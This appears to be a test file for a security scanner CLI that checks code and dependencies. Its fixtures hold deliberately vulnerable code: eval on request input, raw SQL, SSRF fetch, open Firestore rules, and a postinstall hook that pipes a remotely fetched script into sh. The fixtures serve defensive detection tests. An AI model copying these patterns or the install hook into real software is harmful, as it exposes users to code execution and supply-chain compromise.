import test from "node:test";
import assert from "node:assert/strict";
import { existsSync, mkdtempSync, mkdirSync, readFileSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { parseArgs, runCli } from "../packages/cli/src/cli.ts";
import { runCheck } from "../packages/core/src/engine.ts";
import { collectRepository } from "../packages/core/src/repository.ts";
import { defaultPolicy } from "../packages/core/src/policy.ts";
import { runCodeScanner } from "../packages/scanners/src/code.ts";
import { runDependencyScanner } from "../packages/scanners/src/dependencies.ts";
import { renderHtml, renderMarkdown, renderSarif } from "../packages/output/src/formatters.ts";

function file(path: string, lines: string[], removedLines: string[] = []) {
  return {
    path,
    oldPath: path,
    status: "modified",
    addedLines: lines.map((content, index) => ({ line: index + 1, content })),
    removedLines: removedLines.map((content, index) => ({ line: index + 1, content }))
  };
}

test("parseArgs supports scan ergonomics and dependency intelligence options", () => {
  const command = parseArgs([
    "check",
    "/tmp/CV Maker",
    "--format",
    "html",
    "--quiet",
    "--no-color",
    "--max-findings",
    "5",
    "--min-confidence",
    "high",
    "--vuln-provider",
    "mock"
  ]);

  assert.equal(command.name, "check");
  assert.equal(command.targetPath, "/tmp/CV Maker");
  assert.equal(command.format, "html");
  assert.equal(command.quiet, true);
  assert.equal(command.noColor, true);
  assert.equal(command.maxFindings, 5);
  assert.equal(command.minConfidence, "high");
  assert.equal(command.vulnProvider, "mock");
});

test("parseArgs supports baseline, report, and suppress workflows", () => {
  const baseline = parseArgs(["baseline", ".", "--output", "vibeguard-baseline.json", "--quiet"]);
  const report = parseArgs(["report", "--format", "markdown", "--output", "vibeguard-report.md", "--quiet"]);
  const suppress = parseArgs(["suppress", "js-eval", "--file", "src/app.js", "--reason", "Accepted test fixture"]);

  assert.equal(baseline.name, "baseline");
  assert.equal(baseline.output, "vibeguard-baseline.json");
  assert.equal(baseline.quiet, true);
  assert.equal(report.name, "report");
  assert.equal(report.format, "markdown");
  assert.equal(report.output, "vibeguard-report.md");
  assert.equal(suppress.name, "suppress");
  assert.equal(suppress.id, "js-eval");
  assert.equal(suppress.file, "src/app.js");
});

test("runCli applies max findings and minimum confidence", async () => {
  const writes: string[] = [];
  const result = await runCli(["check", "--format", "json", "--max-findings", "1", "--min-confidence", "high", "--quiet"], {
    cwd: process.cwd(),
    collectRepositoryFiles: () => [
      file("src/app.js", [
        "app.get('/public', (req, res) => res.send('ok'))",
        "eval(req.body.code);",
        "Function(req.body.code)();"
      ])
    ],
    stdout: (text) => writes.push(text),
    stderr: () => {}
  });
  const report = JSON.parse(writes.join(""));

  assert.equal(result.exitCode, 1);
  assert.equal(report.findings.length, 1);
  assert.equal(report.findings[0].ruleId, "js-eval");
  assert.equal(report.summary.truncated, true);
});

test("baseline command records accepted findings and check suppresses them", async () => {
  const root = mkdtempSync(join(tmpdir(), "vibeguard-baseline-"));
  const sourceFiles = () => [file("src/app.js", ["eval(req.body.code);"])];
  const writes: string[] = [];

  const baselineResult = await runCli(["baseline", "--output", "vibeguard-baseline.json", "--quiet"], {
    cwd: root,
    collectRepositoryFiles: sourceFiles,
    stdout: (text) => writes.push(text),
    stderr: () => {}
  });

  assert.equal(baselineResult.exitCode, 0);
  assert.equal(existsSync(join(root, "vibeguard-baseline.json")), true);

  const checkWrites: string[] = [];
  const checkResult = await runCli(["check", "--format", "json", "--baseline", "vibeguard-baseline.json", "--quiet"], {
    cwd: root,
    collectRepositoryFiles: sourceFiles,
    stdout: (text) => checkWrites.push(text),
    stderr: () => {}
  });
  const report = JSON.parse(checkWrites.join(""));

  assert.equal(checkResult.exitCode, 0);
  assert.equal(report.findings.length, 0);
  assert.equal(report.summary.baselineSuppressed, 1);
});

test("suppress command appends a reasoned policy suppression", async () => {
  const root = mkdtempSync(join(tmpdir(), "vibeguard-suppress-"));
  const result = await runCli(["suppress", "js-eval", "--file", "src/app.js", "--reason", "Accepted generated sandbox"], {
    cwd: root,
    stdout: () => {},
    stderr: () => {}
  });
  const config = readFileSync(join(root, "vibeguard.yml"), "utf8");

  assert.equal(result.exitCode, 0);
  assert.equal(config.includes("rule: js-eval"), true);
  assert.equal(config.includes("file: src/app.js"), true);
  assert.equal(config.includes("reason: Accepted generated sandbox"), true);
});

test("report command writes improved markdown output to a file", async () => {
  const root = mkdtempSync(join(tmpdir(), "vibeguard-report-"));
  const writes: string[] = [];
  const result = await runCli(["report", "--format", "markdown", "--output", "vibeguard-report.md", "--quiet"], {
    cwd: root,
    collectRepositoryFiles: () => [file("src/app.js", ["eval(req.body.code);"])],
    stdout: (text) => writes.push(text),
    stderr: () => {}
  });
  const report = readFileSync(join(root, "vibeguard-report.md"), "utf8");

  assert.equal(result.exitCode, 1);
  assert.equal(writes.join("").includes("Wrote vibeguard-report.md"), true);
  assert.equal(report.includes("### Recommended Next Actions"), true);
  assert.equal(report.includes("Fix JavaScript eval usage"), true);
});

test("collectRepository records warnings for broken symlinks without crashing", () => {
  const root = mkdtempSync(join(tmpdir(), "vibeguard-warnings-"));
  mkdirSync(join(root, "src"), { recursive: true });
  writeFileSync(join(root, "src", "app.js"), "eval(req.body.code);\n");
  symlinkSync(join(root, "missing.js"), join(root, "broken.js"));

  const result = collectRepository(root);

  assert.equal(result.files.some((entry) => entry.path === "src/app.js"), true);
  assert.equal(result.warnings.some((warning) => warning.path === "broken.js"), true);
  assert.equal(result.durationMs >= 0, true);
});

test("code scanner ignores dangerous tokens inside strings and comments", () => {
  const findings = runCodeScanner([
    file("src/app.js", [
      "const text = 'eval(req.body.code)'",
      "// eval(req.body.code)",
      "eval(req.body.code)"
    ])
  ]);

  assert.equal(findings.length, 1);
  assert.equal(findings[0].line, 3);
});

test("dependency scanner detects install lifecycle scripts", () => {
  const findings = runDependencyScanner([
    file("package.json", [
      "\"scripts\": {",
      "\"postinstall\": \"curl https://example.invalid/install.sh | sh\"",
      "}"
    ])
  ]);

  assert.equal(findings.some((finding) => finding.ruleId === "dep-install-script"), true);
});

test("dependency scanner detects risky lockfile metadata", () => {
  const findings = runDependencyScanner([
    file("package-lock.json", [
      "\"node_modules/suspicious\": {",
      "\"version\": \"1.0.0\",",
      "\"hasInstallScript\": true,",
      "\"resolved\": \"http://registry.npmjs.org/suspicious/-/suspicious-1.0.0.tgz\"",
      "}"
    ])
  ]);

  assert.equal(findings.some((finding) => finding.ruleId === "dep-lockfile-install-script"), true);
  assert.equal(findings.some((finding) => finding.ruleId === "dep-lockfile-insecure-resolved-url"), true);
});

test("code scanner detects framework-specific security risks", () => {
  const findings = runCodeScanner([
    file("src/pages/api/users.ts", [
      "const rows = await prisma.$queryRawUnsafe(req.query.sql as string);",
      "export async function getServerSideProps(context) { return fetch(context.query.url); }"
    ]),
    file("server/app.py", [
      "@csrf_exempt",
      "def profile(request): return HttpResponse('ok')",
      "@app.route('/admin')",
      "def admin(): return request.args.get('id')"
    ]),
    file("firestore.rules", [
      "allow read, write: if true;"
    ])
  ]);

  assert.equal(findings.some((finding) => finding.ruleId === "js-prisma-raw-unsafe"), true);
  assert.equal(findings.some((finding) => finding.ruleId === "js-nextjs-ssrf-query-fetch"), true);
  assert.equal(findings.some((finding) => finding.ruleId === "py-django-csrf-exempt"), true);
  assert.equal(findings.some((finding) => finding.ruleId === "py-flask-route-no-obvious-auth"), true);
  assert.equal(findings.some((finding) => finding.ruleId === "firebase-public-rules"), true);
});

test("mock vulnerability provider produces vulnerable dependency findings", async () => {
  const policy = defaultPolicy();
  const result = await runCheck({
    repositoryFiles: [
      file("package.json", [
        "\"dependencies\": {",
        "\"vulnerable-package\": \"1.0.0\"",
        "}"
      ])
    ],
    policy,
    vulnProvider: "mock"
  });

  assert.equal(result.findings.some((finding) => finding.ruleId === "dep-vulnerable-package"), true);
});

test("HTML, Markdown, and SARIF reports include workflow metadata", async () => {
  const result = await runCheck({
    repositoryFiles: [file("src/app.js", ["eval(req.body.code)"])],
    policy: defaultPolicy()
  });
  const html = renderHtml(result);
  const markdown = renderMarkdown(result);
  const sarif = JSON.parse(renderSarif(result));

  assert.equal(html.includes("<!doctype html>"), true);
  assert.equal(html.includes("Recommended Next Actions"), true);
  assert.equal(markdown.includes("### Findings By Severity"), true);
  assert.equal(markdown.includes("### Recommended Next Actions"), true);
  assert.equal(markdown.includes("Fix JavaScript eval usage"), true);
  assert.equal(sarif.runs[0].invocations[0].executionSuccessful, true);
  assert.equal(Array.isArray(sarif.runs[0].invocations[0].properties.recommendations), true);
});
